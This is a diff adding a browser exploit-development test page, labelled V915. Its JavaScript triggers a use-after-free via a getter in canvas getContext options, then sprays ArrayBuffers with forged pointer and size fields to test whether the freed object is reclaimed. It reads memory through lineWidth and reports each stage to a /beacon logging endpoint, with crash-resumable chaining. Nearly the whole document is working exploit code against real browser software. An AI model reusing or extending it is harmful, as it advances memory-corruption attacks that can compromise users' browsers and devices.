@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V915</title></head>
+<body><pre id="out">V915 — positive control INSIDE the trigger construction: fill arm (plumbing) vs forge arm (stack-top T)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<40;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++]||(new Image());
+  img.src='/beacon/V915-'+tag+'?d='+encodeURIComponent(String(d).slice(0,800))+'&t='+Date.now();
+}
+
+/*
+ * v915 — the control v914 could not provide, inside the only free that
+ * exists on 14.22 (the getter-trigger free; the GC-path dangle produces no
+ * corpse — v914: P3 lw1=1014 across every cycle, the wrapper strong-refs
+ * the impl, nothing frees).
+ *
+ * Why this is the missing control: v911's zero SURV over ~6300 targets is
+ * consistent with the forge never being consumed (every read dies at
+ * null+0x30 on an unconsumed chunk). The board's pre-registered differential
+ * cannot decide until consumption is proven. v904 claimed the AB fill is
+ * consumed as m_buffer, but its own file says "crash before READ" — the
+ * consumption claim is weak. v915 proves or refutes consumption with two
+ * arms, each needing zero region knowledge:
+ *
+ *   arm=fill  (v904 replica): 200 AB(768) filled every 8-byte word with
+ *             1234.5678. NOTE (run-1 correction): a fill crash does NOT
+ *             discriminate — it is expected under consumption (garbage
+ *             m_buffer deref) AND under zero-at-free (null+0x30, v909).
+ *             The fill arm is a sanity replica only; ALL discrimination
+ *             lives in the forge arm.
+ *   arm=forge: same spray order, but bytes +112/+116 = T (default the stack
+ *             top 0x7fffffffe000 — guaranteed mapped), +120 cap=1, +124
+ *             size=1, everything else ZERO (L7 touch set is exactly
+ *             {+112, +124, T+0x30}; zeros elsewhere are safe). at(0) reads
+ *             T+0x30 — stride-free (size=1 => State[0] is out-of-line here,
+ *             so sizeof(State) does not enter). If the plumbing is proven by
+ *             arm=fill, a return of ANY value here (L6) is the positive
+ *             control: the forge mechanism works on 14.22 and the v911 grid
+ *             zero becomes a REAL region verdict. A crash here after a fill
+ *             crash = forge written but not consumed (offset drift or the
+ *             AB landing is not chunk-start) — S-sweep and order variants
+ *             follow from that matrix, not before it.
+ *
+ * Decode matrix (one arm per load, auto-chained, crash-resumable):
+ *   forge-SURV (any value, L6)        -> CONTROL POSITIVE at a mapped T;
+ *                                        the v911 grid zero becomes a real
+ *                                        region verdict on consumed reads.
+ *   fill-crash + forge-crash x3       -> forge written but NOT consumed
+ *                                        (T is mapped, so a consumed read
+ *                                        cannot crash): offset drift or the
+ *                                        AB landing is not chunk-start.
+ *                                        Order variants + +112-offset search
+ *                                        follow from that base.
+ *   fill-crash alone                  -> expected under both hypotheses
+ *                                        (v909); no discrimination claimed.
+ *
+ * State machine (v911 pattern): arm persists in localStorage; the NEXT arm
+ * is persisted BEFORE the risky read, so a crash advances the chain on the
+ * guide reload. Forge attempts are counted; after 3 crashes the chain parks
+ * (EXHAUSTED-CONTROL). ?arm=fill|forge|reset overrides.
+ */
+
+var MARK_F = 1234.5678;
+var qs = location.search;
+/* T default: 0x7fffffffc000 — 4 pages below the classic stack top
+   (v911 band-3 max 0x7fffffffe000), guaranteed mapped in any booted
+   process. Run-1 note (2026-11-09): the first draft used tHi=0x7fffffff
+   (16-digit, non-canonical T=0x7fffffffffffe000) — every consumed read
+   would fault there regardless of consumption; that run's matrix is VOID.
+   ?t=HI-LO overrides. */
+var tHi = 0x00007fff, tLo = 0xffffc000;
+var tm = qs.match(/[?&]t=([0-9a-fA-F]{1,8})-([0-9a-fA-F]{1,8})/);
+if (tm) { tHi = parseInt(tm[1],16); tLo = parseInt(tm[2],16); }
+var tHex = '0x' + ('00000000'+tHi.toString(16)).slice(-8) + ('00000000'+tLo.toString(16)).slice(-8);
+
+/* Sync-XHR beacon for PRE markers: forces the request out before returning,
+   so a crash at the following read cannot swallow the marker (async image
+   GETs are lost in the crash race — v915 run-1 lost two READ-PRE beacons
+   exactly this way). */
+function bks(tag,d){
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon/V915-'+tag+'?d='+encodeURIComponent(String(d).slice(0,800))+'&t='+Date.now(),false);x.send(null);}catch(e){}
+}
+
+var arm = null, fA = 0;
+try {
+  var ma = qs.match(/[?&]arm=(fill|forge|reset)/);
+  if (ma) {
+    if (ma[1] === 'reset') { localStorage.removeItem('v915_arm'); localStorage.removeItem('v915_forge_attempts'); localStorage.removeItem('v915_autocycles'); bk('RESET','state cleared'); }
+    else { localStorage.setItem('v915_arm', ma[1]); }
+  }
+  arm = localStorage.getItem('v915_arm') || 'fill';
+  fA = parseInt(localStorage.getItem('v915_forge_attempts')) || 0;
+} catch(e) {}
+if (arm === 'forge' && fA >= 3) {
+  /* Parked state — but the User's Guide cannot receive query strings
+     (serve.py serves --default at '/'), so ?arm=reset is unreachable
+     on-device. AUTO-RESET: clear the parked state and rerun the chain once;
+     park for good after the second full cycle (no infinite crash loops). */
+  var cyc = 0;
+  try { cyc = parseInt(localStorage.getItem('v915_autocycles')) || 0; } catch(e) {}
+  if (cyc < 1) {
+    try {
+      localStorage.setItem('v915_autocycles', '1');
+      localStorage.setItem('v915_arm', 'fill');
+      localStorage.removeItem('v915_forge_attempts');
+    } catch(e) {}
+    bk('AUTO-RESET','parked state cleared — rerunning fill with corrected T');
+    setTimeout(function(){ location.reload(); }, 500);
+  } else {
+    bk('EXHAUSTED-CONTROL','forge crashed 3x on cycle 2 as well — parked for good; matrix: forge not consumed (T mapped), see results row');
+  }
+} else {
+  bk('BOOT','arm='+arm+' T='+tHex+' forgeAttempts='+fA);
+
+  /* ---- v911-identical UAF cycle + AB(768) spray ---- */
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  var innerCtx = null;
+  var uafOpts = {};
+  Object.defineProperty(uafOpts, 'alpha', {get: function() {
+    innerCtx = canvas.getContext('2d');
+    return true;
+  }});
+  canvas.getContext('bitmaprenderer', uafOpts);
+  if (!innerCtx) { bk('FAIL','no-uaf'); }
+  else {
+    for (var f = 0; f < 600; f++) { var tmp = new ArrayBuffer(16); }
+    var dvs = [];
+    for (var s = 0; s < 200; s++) {          /* v904 count */
+      var ab = new ArrayBuffer(768);
+      var dv = new DataView(ab);
+      if (arm === 'fill') {
+        for (var p = 0; p + 8 <= 768; p += 8) dv.setFloat64(p, MARK_F, true);
+      } else {
+        /* forge arm: zeros everywhere except the L7 touch-set cells */
+        dv.setUint32(112, tLo, true);
+        dv.setUint32(116, tHi, true);
+        dv.setUint32(120, 1, true);   /* m_capacity */
+        dv.setUint32(124, 1, true);   /* m_size     */
+      }
+      dvs.push(dv);
+    }
+    bk('SPRAY','arm='+arm+'|n=200|T='+tHex);
+    bks('SPRAY-SYNC','arm='+arm+'|n=200|T='+tHex);
+
+    /* persist the NEXT arm before the risky read (crash advances the chain) */
+    try {
+      if (arm === 'fill') { localStorage.setItem('v915_arm', 'forge'); }
+      else { localStorage.setItem('v915_forge_attempts', String(fA + 1)); }
+      localStorage.setItem('v915_note', 'pre-read@' + arm);
+    } catch(e) {}
+    var wd = setTimeout(function () { try { localStorage.setItem('v915_note', 'watchdog@' + arm); } catch(e) {} setTimeout(function(){ location.reload(); }, 300); }, 15000);
+
+    bks('READ-PRE','the next event is the forged read (or the death)');
+    var leaked = innerCtx.lineWidth;
+    clearTimeout(wd);
+    /* ALIVE past the read: L6 — any returned value is a return-channel event */
+    var b8=new ArrayBuffer(8), fa=new Float64Array(b8), u=new Uint32Array(b8);
+    fa[0]=leaked;
+    var lwhex = '0x'+('00000000'+u[1].toString(16)).slice(-8)+('00000000'+u[0].toString(16)).slice(-8);
+    bk('READ-OK','arm='+arm+'|lw='+leaked+'|hex='+lwhex);
+    if (arm === 'forge') {
+      try { localStorage.removeItem('v915_autocycles'); } catch(e) {}
+      bk('CONTROL','POSITIVE forge consumed at T='+tHex+' (any value counts, L6); v911 grid zero becomes a region verdict on consumed reads');
+    } else {
+      bk('CONTROL','ANOMALY fill survived with garbage m_buffer='+lwhex+' — inspect before trusting the matrix');
+    }
+    /* clean the forged cells so a surviving process stays safe */
+    for (var c = 0; c < dvs.length; c++) {
+      dvs[c].setFloat64(112, 0, true);
+      dvs[c].setUint32(120, 0, true);
+      dvs[c].setUint32(124, 0, true);
+    }
+    bk('DONE','arm='+arm+' complete; reload for the other arm (?arm=forge or plain reload)');
+  }
+}
+</script></body></html>
